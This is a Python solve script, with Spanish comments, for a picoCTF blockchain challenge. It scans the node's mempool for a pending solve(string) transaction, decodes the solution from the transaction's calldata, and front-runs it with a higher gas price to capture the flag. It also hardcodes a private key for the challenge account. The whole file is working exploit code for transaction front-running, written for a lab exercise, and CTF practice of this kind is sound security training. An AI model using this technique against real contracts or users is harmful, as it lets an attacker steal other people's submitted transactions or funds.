#!/usr/bin/env python3
import time
import requests
from eth_account import Account
from eth_utils import keccak, to_checksum_address
from web3 import Web3

try:
    from eth_abi import decode, encode
except ImportError:
    from eth_abi import decode_abi as decode
    from eth_abi import encode_abi as encode

RPC_URL = "http://candy-mountain.picoctf.net:63428"
CONTRACT = "0x5FbDB2315678afecb367f032d93F642f64180aa3"
PRIVATE_KEY = "0xc8fce050cae5478e9afdabd6ae663bccbe3b92ffd5cd977092a096308962c0a2"

w3 = Web3(Web3.HTTPProvider(RPC_URL))
acct = Account.from_key(PRIVATE_KEY)
SENDER = acct.address
CONTRACT = to_checksum_address(CONTRACT)

SOLVE_SELECTOR = keccak(text="solve(string)")[:4].hex()
GETFLAG_SELECTOR = "0x" + keccak(text="getFlag()")[:4].hex()
STUDENT_SELECTOR = "0x" + keccak(text="studentAddress()")[:4].hex()

ABI = [
    {
        "inputs": [{"internalType": "string", "name": "solution", "type": "string"}],
        "name": "solve",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "getFlag",
        "outputs": [{"internalType": "string", "name": "", "type": "string"}],
        "stateMutability": "view",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "studentAddress",
        "outputs": [{"internalType": "address", "name": "", "type": "address"}],
        "stateMutability": "view",
        "type": "function",
    },
]

contract = w3.eth.contract(address=CONTRACT, abi=ABI)


def rpc(method, params=None):
    if params is None:
        params = []

    r = requests.post(
        RPC_URL,
        json={
            "jsonrpc": "2.0",
            "id": 1,
            "method": method,
            "params": params,
        },
        timeout=5,
    )

    try:
        data = r.json()
    except Exception:
        print("[!] Respuesta no JSON:", r.text[:300])
        return None

    if "error" in data:
        return None

    return data.get("result")


def hexint(x):
    if x is None:
        return 0
    if isinstance(x, int):
        return x
    return int(x, 16)


def iter_pending_txs():
    """
    Prueba varios métodos de mempool porque depende del nodo:
    - txpool_content
    - eth_pendingTransactions
    - eth_getBlockByNumber("pending", true)
    """
    seen = set()

    txpool = rpc("txpool_content")
    if isinstance(txpool, dict):
        for section in ("pending", "queued"):
            accounts = txpool.get(section, {})
            for _addr, nonces in accounts.items():
                for _nonce, tx in nonces.items():
                    h = tx.get("hash")
                    if h in seen:
                        continue
                    if h:
                        seen.add(h)
                    yield tx

    pending = rpc("eth_pendingTransactions")
    if isinstance(pending, list):
        for tx in pending:
            h = tx.get("hash")
            if h in seen:
                continue
            if h:
                seen.add(h)
            yield tx

    block = rpc("eth_getBlockByNumber", ["pending", True])
    if isinstance(block, dict):
        for tx in block.get("transactions", []):
            h = tx.get("hash")
            if h in seen:
                continue
            if h:
                seen.add(h)
            yield tx


def decode_solution(calldata):
    if not calldata or calldata == "0x":
        return None

    data = calldata[2:] if calldata.startswith("0x") else calldata

    if not data.startswith(SOLVE_SELECTOR):
        return None

    raw_args = bytes.fromhex(data[8:])

    try:
        return decode(["string"], raw_args)[0]
    except Exception as e:
        print("[!] Error decodificando solve(string):", e)
        return None


def make_solve_calldata(solution):
    encoded = encode(["string"], [solution])
    return "0x" + SOLVE_SELECTOR + encoded.hex()


def try_get_flag():
    try:
        flag = contract.functions.getFlag().call()
        print(f"[+] FLAG: {flag}")
        return True
    except Exception as e:
        print("[*] getFlag todavía no disponible.")
        return False


def print_status():
    print(f"[+] RPC       = {RPC_URL}")
    print(f"[+] CONTRACT  = {CONTRACT}")
    print(f"[+] SENDER    = {SENDER}")

    try:
        print(f"[+] chainId   = {w3.eth.chain_id}")
    except Exception as e:
        print("[!] No pude leer chainId:", e)

    try:
        bal = w3.eth.get_balance(SENDER)
        print(f"[+] balance   = {w3.from_wei(bal, 'ether')} ETH")
    except Exception as e:
        print("[!] No pude leer balance:", e)

    try:
        latest = w3.eth.get_block("latest")
        print(f"[+] baseFee   = {latest.get('baseFeePerGas')}")
    except Exception:
        pass

    try:
        student = contract.functions.studentAddress().call()
        print(f"[+] studentAddress = {student}")
        if student.lower() != SENDER.lower():
            print("[!] Tu cuenta NO coincide con studentAddress.")
            print("[!] Si solve() revierte, deja que mine el bot y luego lee getFlag().")
    except Exception as e:
        print("[*] No pude leer studentAddress:", e)


def send_solution(solution, bot_tx=None):
    print(f"[+] Intentando front-run con solution={solution!r}")

    balance = w3.eth.get_balance(SENDER)
    latest = w3.eth.get_block("latest")
    base_fee = latest.get("baseFeePerGas") or 0

    gas = 250000

    # Tu cuenta aparece con 0 ETH. En estas instancias a veces gasPrice=0 funciona.
    # Si baseFee > 0 y balance=0, no podremos pagar gas; en ese caso solo esperamos al bot.
    if balance == 0 and base_fee > 0:
        print("[!] Balance 0 y baseFee > 0: no puedo mandar tx pagada.")
        print("[*] Esperando a que mine la víctima para leer getFlag().")
        return False

    bot_gas_price = 0
    if bot_tx and bot_tx.get("gasPrice") is not None:
        bot_gas_price = hexint(bot_tx.get("gasPrice"))

    if balance == 0:
        gas_price = 0
    else:
        # Front-run: más gasPrice que el bot.
        gas_price = max(bot_gas_price * 5 + 1, w3.to_wei(2, "gwei"))

    nonce = w3.eth.get_transaction_count(SENDER, "pending")

    tx = {
        "chainId": w3.eth.chain_id,
        "nonce": nonce,
        "to": CONTRACT,
        "value": 0,
        "gas": gas,
        "gasPrice": gas_price,
        "data": make_solve_calldata(solution),
    }

    print(f"[+] nonce    = {nonce}")
    print(f"[+] gasPrice = {gas_price}")

    try:
        signed = acct.sign_transaction(tx)
        raw = getattr(signed, "raw_transaction", None) or signed.rawTransaction
        txh = w3.eth.send_raw_transaction(raw)
        print(f"[+] Tx enviada: {txh.hex()}")

        receipt = w3.eth.wait_for_transaction_receipt(txh, timeout=120)
        print(f"[+] Receipt status={receipt.status}, block={receipt.blockNumber}")

        return receipt.status == 1

    except Exception as e:
        print("[!] No pude enviar/minar nuestra tx:", e)
        return False


def wait_for_tx(tx_hash, timeout=180):
    if not tx_hash:
        return False

    print(f"[*] Esperando tx víctima {tx_hash} ...")
    end = time.time() + timeout

    while time.time() < end:
        try:
            r = w3.eth.get_transaction_receipt(tx_hash)
            if r:
                print(f"[+] Tx víctima minada: status={r.status}, block={r.blockNumber}")
                return True
        except Exception:
            pass

        time.sleep(2)

    print("[!] La tx víctima no minó dentro del timeout.")
    return False


def main():
    print_status()

    if try_get_flag():
        return

    print("[+] Vigilando mempool...")

    while True:
        found = False

        for tx in iter_pending_txs():
            to_addr = tx.get("to")
            if not to_addr:
                continue

            if to_addr.lower() != CONTRACT.lower():
                continue

            calldata = tx.get("input") or tx.get("data")
            solution = decode_solution(calldata)

            if not solution:
                continue

            found = True

            print("\n[+] Tx pendiente encontrada")
            print(f"    hash     = {tx.get('hash')}")
            print(f"    from     = {tx.get('from')}")
            print(f"    to       = {tx.get('to')}")
            print(f"    gasPrice = {tx.get('gasPrice')}")
            print(f"[+] SOLUTION = {solution!r}")

            ok = send_solution(solution, tx)

            if ok:
                time.sleep(1)
                if try_get_flag():
                    return
            else:
                print("[*] Nuestra tx no funcionó; probando esperar a la víctima.")
                wait_for_tx(tx.get("hash"), timeout=180)
                if try_get_flag():
                    return

        if not found:
            print("[*] No veo solve(string) pendiente todavía...")

        time.sleep(1)


if __name__ == "__main__":
    main()
